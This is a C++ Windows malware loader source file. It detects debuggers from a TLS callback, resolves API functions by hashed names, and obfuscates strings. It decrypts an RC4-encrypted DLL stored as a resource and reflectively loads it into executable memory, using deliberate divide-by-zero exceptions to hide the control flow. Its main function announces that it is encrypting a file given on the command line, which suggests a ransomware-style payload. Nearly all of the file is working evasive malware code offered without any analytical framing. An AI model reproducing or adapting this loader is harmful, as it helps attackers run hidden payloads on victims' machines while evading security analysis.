#include <windows.h>
#include <iostream>
#include "xxhash.h"
#include <wincrypt.h>
#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <string>
#include <cmath>
#include <iomanip>
#include <vector>
#include <sstream>
#include <limits.h>
#include <string>
#include <math.h>
#include "my_definitions.h"

void NTAPI tls_callback(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

#ifdef _M_IX86
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")
#else
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback")
#endif

EXTERN_C
#ifdef _M_X64
#pragma const_seg (".CRT$XLB")
const
#else
#pragma data_seg (".CRT$XLB")
#endif

PIMAGE_TLS_CALLBACK _tls_callback = tls_callback; 
#pragma data_seg ()
#pragma const_seg ()


using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

const unsigned char rc4_key[16] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF,
                                    0xFE, 0xDC, 0xBA, 0x09, 0x87, 0x65, 0x43, 0x21 };


HMODULE GetModuleHandleH(uint64_t dwModuleNameHash) {

    if (dwModuleNameHash == NULL)
        return NULL;

#ifdef _WIN64
    PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {

        if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {

            CHAR UpperCaseDllName[MAX_PATH];

            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';
            std::string Uppercasedllname_s = UpperCaseDllName;
            if (XXH64(Uppercasedllname_s.c_str(), Uppercasedllname_s.size(), 0) == dwModuleNameHash)
                return (HMODULE)(pDte->Reserved2[0]);

        }
        else {
            break;
        }

        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}


FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


    
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        
        if (strcmp(lpApiName, pFunctionName) == 0) {
             
            return (FARPROC)pFunctionAddress;
        }

         
    }


    return NULL;
}

LPVOID search_expH(HMODULE base, uint64_t hash)
{
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;

    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr = NULL;


    

    dos = (PIMAGE_DOS_HEADER)base;
    nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    
    if (rva == 0) return NULL;

    exp = (PIMAGE_EXPORT_DIRECTORY)RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;

    
    if (cnt == 0) return NULL;

    adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    

    do {
        
        api = RVA2VA(PCHAR, base, sym[cnt - 1]);
        std::string api_s = api;
        
        
        
        
        
        
        
        
        uint64_t f = XXH64(api_s.c_str(), api_s.size(), 0);
       
        
        if (f == hash) {
            
            api_adr = GetProcAddressReplacement(base, api);
            
            
            break;
        }
    } while (--cnt && api_adr == 0);
    return api_adr;
};





unsigned char* DecryptDLLInMemory_RC4(LPVOID pLockedRes, DWORD dwResSize, const unsigned char* key, DWORD keySize) {
    unsigned char* encrypted_dll = (unsigned char*)pLockedRes;

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    myLoadLibraryA fnmyLoadLibraryA = (myLoadLibraryA)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0xcd0ae072e3902066));

    int advapi_arr[] = {182,227,88,98,111,206,280,305,93,212,150,196};
    char advapi_char[sizeof(advapi_arr)/4] = {};
    for (int i = 0; i < 12; i++) {
        advapi_char[i] = advapi_arr[i] - (rand() & 0xff);
    }



    HMODULE base = fnmyLoadLibraryA(advapi_char);

    myCryptAcquireContextW fnmyCryptAcquireContextW = (myCryptAcquireContextW)search_expH(base, 0x5795cbfb10b8a3ec);
    if (!fnmyCryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        
        return nullptr;
    }
    myCryptReleaseContext fnmyCryptReleaseContext = (myCryptReleaseContext)search_expH(base, 0xb076a1a137f95440);
    myCryptCreateHash fnmyCryptCreateHash = (myCryptCreateHash)search_expH(base, 0x57c85a1505eb5e0b);
    if (!fnmyCryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        
        fnmyCryptReleaseContext(hProv, 0);
        return nullptr;
    }
    myCryptDestroyHash fnmyCryptDestroyHash = (myCryptDestroyHash)search_expH(base, 0x26f633178568427a);
    myCryptHashData fnmyCryptHashData = (myCryptHashData)search_expH(base, 0xf6040f9246a78bb7);
    if (!fnmyCryptHashData(hHash, key, keySize, 0)) {
        
        fnmyCryptDestroyHash(hHash);
        fnmyCryptReleaseContext(hProv, 0);
        return nullptr;
    }

    myCryptDeriveKey fnmyCryptDeriveKey = (myCryptDeriveKey)search_expH(base, 0x2cba71bd9edc5628);
    if (!fnmyCryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
        
        fnmyCryptDestroyHash(hHash);
        fnmyCryptReleaseContext(hProv, 0);
        return nullptr;
    }

    fnmyCryptDestroyHash(hHash);
    myCryptDestroyKey fnmyCryptDestroyKey = (myCryptDestroyKey)search_expH(base, 0x3119b2da5f5cbe5a);
    unsigned char* decrypted_dll = (unsigned char*)malloc(dwResSize);
    if (!decrypted_dll) {
        
        fnmyCryptReleaseContext(hProv, 0);
        fnmyCryptDestroyKey(hKey);
        return nullptr;
    }

    memcpy(decrypted_dll, encrypted_dll, dwResSize);
    myCryptDecrypt fnmyCryptDecrypt = (myCryptDecrypt)search_expH(base, 0xff7e0dab8f199fad);
    if (!fnmyCryptDecrypt(hKey, 0, TRUE, 0, decrypted_dll, &dwResSize)) {
        
        free(decrypted_dll);
        fnmyCryptDestroyKey(hKey);
        fnmyCryptReleaseContext(hProv, 0);
        return nullptr;
    }

    fnmyCryptDestroyKey(hKey);
    fnmyCryptReleaseContext(hProv, 0);

    return decrypted_dll;
}



bool LoadDLLIntoMemory(unsigned char* dllBytes) {
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    
    
    
    myVirtualAlloc fnmyVirtualAlloc = (myVirtualAlloc)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x0b634b2e9215fdc0));
    LPVOID dllBase = fnmyVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    

    
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

    
    std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }

    
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
    DWORD relocationsProcessed = 0;
    myReadProcessMemory fnReadProcessMemory = (myReadProcessMemory)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0xd1ae5130014e59c5));
    while (relocationsProcessed < relocations.Size)
    {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

            if (relocationEntries[i].Type == 0)
            {
                continue;
            }

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;


            fnReadProcessMemory(((HANDLE)-1), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            
            addressToPatch += deltaImageBase;
            std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
    }

    
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;
    myLoadLibraryA fnmyLoadLibraryA = (myLoadLibraryA)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0xcd0ae072e3902066));
    myGetProcAddress fnmyGetProcAddress = (myGetProcAddress)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x5a8106365c46d87f));

    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;

        library = fnmyLoadLibraryA(libraryName);

        if (library)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)fnmyGetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)fnmyGetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }

    
    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    HeapFree(GetProcessHeap(), 0, dllBytes);

    return true;
}
























const char* varValue8;





const char* varValue10 = nullptr;









DWORD tlsIndex;

int FirstHandler_helper() {


    srand(2);
    
    std::vector<std::string> hex_strings;
    int my_array[] = { 255,265,161,334,171,194,406,241,258,151,350,97,232,324,263,366 };
    std::vector<std::string> abc;
    for (int i = 0; i < 16; i++) {
        int rand_val = rand();  
        int curr_byte = rand_val % 256;
        
        unsigned char c = (my_array[i] - curr_byte);
        std::stringstream ss;
        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);
        hex_strings.push_back(ss.str());
    }

    std::string combined_hex_string;
    for (const auto& hex_str : hex_strings) {
        combined_hex_string += hex_str;
    }
    myTlsAlloc fnmyTlsAlloc = (myTlsAlloc)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x056f1a56bc867be6));
    tlsIndex = fnmyTlsAlloc();
    

    std::string* tlsKey = new std::string(combined_hex_string);


    myTlsSetValue fnmyTlsSetValue = (myTlsSetValue)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x21727e2d69791f0f));

    if (!fnmyTlsSetValue(tlsIndex, (LPVOID)tlsKey)) {
        
        return -1;
    }


    return 0;

}

int SecondHandler_helper() {
    __try {
        int a = 9;
        int c = 0;
        
        std::cout << a / c;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        
        
        myFindResourceW fnmyFindResourceW = (myFindResourceW)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x308bbb85ef38e784));

        HRSRC hRes = fnmyFindResourceW(nullptr, MAKEINTRESOURCE(101), RT_RCDATA); 
        if (!hRes) {
            
            return -1;
        }

        myLoadResource fnmyLoadResource = (myLoadResource)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0xd1063c4b582e87e3));
        HGLOBAL hLoadedRes = fnmyLoadResource(nullptr, hRes);
        mySizeofResource fnmySizeofResource= (mySizeofResource)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x6d4ae90d0730641f));
        DWORD dwResSize = fnmySizeofResource(nullptr, hRes);
        myLockResource fnmyLockResource = (myLockResource)(search_expH(GetModuleHandleH(0xfcc032ff143aa692), 0x14df0169dcd87279));
        LPVOID pLockedRes = fnmyLockResource(hLoadedRes);

        
        unsigned char* decrypted_dll = DecryptDLLInMemory_RC4(pLockedRes, dwResSize, rc4_key, sizeof(rc4_key));
        if (!decrypted_dll) {
            
            return -1;
        }

        
        if (!LoadDLLIntoMemory(decrypted_dll)) {
            
            free(decrypted_dll);
            return -1;
        }

        free(decrypted_dll);
        
    }
}

void SecondHandler() {
    const char varName1[] = { 'L','S','S','I','n','i','t','A','u','t','h','P','a','c','k','a','g','e','\0' };
    const char varValue1[] = { 'A','u','t','h','P','k','g','_','v','1','.','0','\0' };

    const char varName2[] = { 'S','Y','S','T','E','M','B','O','O','T','D','R','I','V','E','\0' };
    const char varValue2[] = { 'C',':','\\','\0' };

    const char varName3[] = { 'P','R','O','C','E','S','S','O','R','_','M','O','D','E','\0' };
    const char varValue3[] = { 'x','8','6','_','6','4','\0' };

    const char varName4[] = { 'W','I','N','D','O','W','S','_','S','E','C','U','R','I','T','Y','_','I','D','\0' };
    const char varValue4[] = { 'S','E','C','I','D','-','9','8','7','6','5','4','3','2','1','\0' };

    const char varName5[] = { 'P','R','O','G','R','A','M','F','I','L','E','S','X','8','6','_','I','D','\0' };
    const char varValue5[] = { 'P','r','o','g','F','i','l','e','s','3','2','_','x','8','6','\0' };

    const char varName6[] = { 'V','I','R','T','U','A','L','_','M','E','M','O','R','Y','_','P','O','O','L','\0' };
    const char varValue6[] = { '2','0','4','8','M','B','\0' };

    const char varName7[] = { 'S','Y','S','L','O','G','_','V','E','R','B','O','S','I','T','Y','\0' };
    const char varValue7[] = { '3','\0' };

    const char varName8[] = { 'U','S','E','R','L','O','G','_','V','E','R','B','O','S','I','T','Y','\0' };
    

    const char varName9[] = { 'M','E','M','O','R','Y','_','P','A','G','E','_','L','I','M','I','T','\0' };
    const char varValue9[] = { '5','0','0','0','0','\0' };

    const char varName10[] = { 'M','E','M','O','R','Y','_','S','W','A','P','_','L','I','M','I','T','\0' };
    

    const char varName11[] = { 'W','I','N','_','E','V','E','N','T','_','L','O','G','_','P','A','T','H','\0' };
    const char varValue11[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','L','o','g','s','\\','E','v','e','n','t','s','.','e','v','t','x','\0' };

    const char varName12[] = { 'A','P','P','L','I','C','A','T','I','O','N','_','E','R','R','O','R','_','L','O','G','\0' };
    const char varValue12[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','L','o','g','s','\\','A','p','p','E','r','r','o','r','s','.','l','o','g','\0' };

    std::string tlsIndexStr = std::to_string(tlsIndex);
    varValue8 = tlsIndexStr.c_str();

    HMODULE kernel32 = GetModuleHandleH(0xfcc032ff143aa692);
    mySetEnvironmentVariableA fnmySetEnvironmentVariableA = (mySetEnvironmentVariableA)(search_expH(kernel32, 0x968bc8b894eae2b5));
    fnmySetEnvironmentVariableA(varName1, varValue1);
    fnmySetEnvironmentVariableA(varName2, varValue2);
    fnmySetEnvironmentVariableA(varName3, varValue3);
    fnmySetEnvironmentVariableA(varName4, varValue4);
    fnmySetEnvironmentVariableA(varName5, varValue5);
    fnmySetEnvironmentVariableA(varName6, varValue6);
    fnmySetEnvironmentVariableA(varName7, varValue7);
    
    fnmySetEnvironmentVariableA(varName9, varValue9);
    fnmySetEnvironmentVariableA(varName10, varValue10);
    fnmySetEnvironmentVariableA(varName11, varValue11);
    fnmySetEnvironmentVariableA(varName12, varValue12);
    fnmySetEnvironmentVariableA(varName8, varValue8);

    SecondHandler_helper();
}

void FirstHandler() {
        FirstHandler_helper();

}




void NTAPI __stdcall tls_callback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    
    if (Reason == DLL_PROCESS_ATTACH) {
        
        
        __try {
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)


#ifndef _WIN64
            PPEB pPeb = (PPEB)__readfsdword(0x30);
            DWORD dwNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);
#else
            PPEB pPeb = (PPEB)__readgsqword(0x60);
            DWORD dwNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0xBC);
#endif 
            int a = dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED;
            int b = 1;
            int c = b / a;
            if (dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED)
                goto being_debugged;
        being_debugged:
            exit(c);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            FirstHandler();
        }

        
        
        
        
    }
}




int main(int argc, char* argv[]) {
    std::cout << "[*] Encrypting contents of " << argv[1] << std::endl;
    std::cout << "[*]--------------------------------------------------[*]" << std::endl;
        varValue10 = argv[1];
        __try {
            int f = 69;
            int x = 420;
            int c = (int)(x * f) / 0;
            std::cout << c;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            
            SecondHandler();
        }
        return 0;
}
